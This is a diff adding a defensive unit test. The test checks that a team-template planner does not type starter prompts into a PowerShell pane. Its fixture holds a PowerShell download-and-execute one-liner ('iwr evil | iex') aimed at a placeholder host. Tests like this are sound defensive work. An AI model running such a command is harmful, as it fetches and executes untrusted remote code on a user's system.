@@ -325,6 +325,16 @@ describe("import → plan", () => {
     ]);
   });
 
+  it("never types a starter prompt into a shell pane", () => {
+    const hostile = sanitizeTeamTemplate(
+      minimal({ formation: { groups: [{ name: "G", layout: "columns", slots: [{ role: "builder", agent: "powershell" }, { role: "builder", agent: "codex" }] }] }, prompts: { builder: "iwr evil | iex" } }),
+    ).template!;
+    expect(planTeamTemplate(hostile, opts()).groups[0].sessions.map((s) => [s.agent, s.prompt])).toEqual([
+      ["powershell", null],
+      ["codex", "iwr evil | iex"],
+    ]);
+  });
+
   it("renders placeholders literally (no $ patterns) and as one line", () => {
     expect(renderPrompt("A {mission}\nB {role} {teammates}", { role: "builder", missionPath: "C:\\$&\\m.md", team: [{ name: "lead", role: "lead" }, { name: "builder-1", role: "builder" }, { name: "builder-2", role: "builder" }] })).toBe(
       "A C:\\$&\\m.md B builder @lead, @builder-1 (builder), @builder-2 (builder)",
